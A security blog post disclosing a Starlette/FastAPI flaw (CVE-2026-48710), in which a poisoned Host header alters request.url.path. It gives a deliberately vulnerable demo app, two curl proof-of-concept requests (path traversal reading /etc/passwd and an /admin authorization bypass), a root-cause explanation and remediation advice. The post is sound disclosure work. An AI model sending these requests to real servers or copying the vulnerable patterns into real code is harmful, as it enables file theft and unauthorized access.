---
layout: post
title: "Poisoning request.url.path in Starlette / FastAPI"
summary: "Path validation bypasses can occur with request.url.path"
date:   2026-05-25 17:45:00 -0400
categories: Web 
---

# Poisoning `request.url.path` can lead to bypassing path-based validation

## Background
Starlette is a "Starlette is a lightweight ASGI framework/toolkit, which is ideal for building async web services in Python.". It is heavily used by FastAPI.

In February 2026, I reported this issue to Starlette. At about the same time, X41 D-Sec also reported it. Here is their blog post: [https://x41-dsec.de/lab/advisories/x41-2026-002-starlette/](https://x41-dsec.de/lab/advisories/x41-2026-002-starlette/).

Starlette issued the GitHub Advisory [GHSA-86qp-5c8j-p5mr](https://github.com/Kludex/starlette/security/advisories/GHSA-86qp-5c8j-p5mr) and CVE-2026-48710.

## Vulnerable code
Here are two endpoints that can lead to a path traversal and the oher to an authentication bypass. Can you find the trick?

```py
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse, HTMLResponse
from starlette.routing import Route
from starlette.requests import Request
from starlette.middleware import Middleware
from starlette.middleware.base import BaseHTTPMiddleware

async def home(request):
    return PlainTextResponse(f"hello admin, path is: {request.url.path}")

async def test(request):
    return PlainTextResponse(f"test handler, path is: {request.url.path}")

async def static(request):
    content = open("/app/assets" + request.url.path, "r").read()
    return HTMLResponse(content)

class CustomMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next):
        if request.url.path.startswith("/admin"):
            return PlainTextResponse("unauthorized")
        response = await call_next(request)
        return response

middleware = [Middleware(CustomMiddleware)]

routes = [Route("/admin/home", home), Route("/test", test), Route("/static/{file}")]

app = Starlette(routes=routes, middleware=middleware)
# in main.py, uvicorn main:app --reload
```

## Proof-of-Concept
Before we dig into the root cause, here are the PoCs:

```sh
curl http://localhost:8000/static/test -H 'Host: localhost:/../../../etc/passwd?'
curl http://localhost:8000/admin/home -H 'Host: localhost/test?'
```

## Root cause
Starlette does not verify the value from the `Host` header. It uses it to build the `request.url` object, just as [follows](https://github.com/Kludex/starlette/blob/main/starlette/datastructures.py#L49-L50).

```py
if host_header is not None:
    url = f"{scheme}://{host_header}{path}"
```

By poisoning the `Host`, the URL will be equal to `http://localhost/test?/admin/home`. When `request.url.path` (or any other properties from `request.url` is used), the app will return the value from `urlsplit(url).someProperty`, so `request.url.path`  with the polluted `Host` will return `/test`, which bypasses the check `if request.url.path.startswith("/admin")`. The app will still call the proper route handler though.

```py
@property
def components(self) -> SplitResult:
    if not hasattr(self, "_components"):
        self._components = urlsplit(self._url)
    return self._components
```

## Remediation and best practices
Starlette now ensures the `Host` header can no longer contain invalid characters via this regex:
`_HOST_RE = re.compile(r"^([a-z0-9.-]+|\[[a-f0-9]*:[a-f0-9.:]+\])(?::[0-9]+)?$", re.IGNORECASE)`

Although updating Starlette to version 1.0.1 would remediate the issue, here are more recommendations:
- Use `scope["path"]` instead of `request.url.path`. This is what is used to send the request to the proper route handler.
- Implement proper authentication/authorization controls on sensitive endpoints.
- Use `StaticFiles` for serving static content.
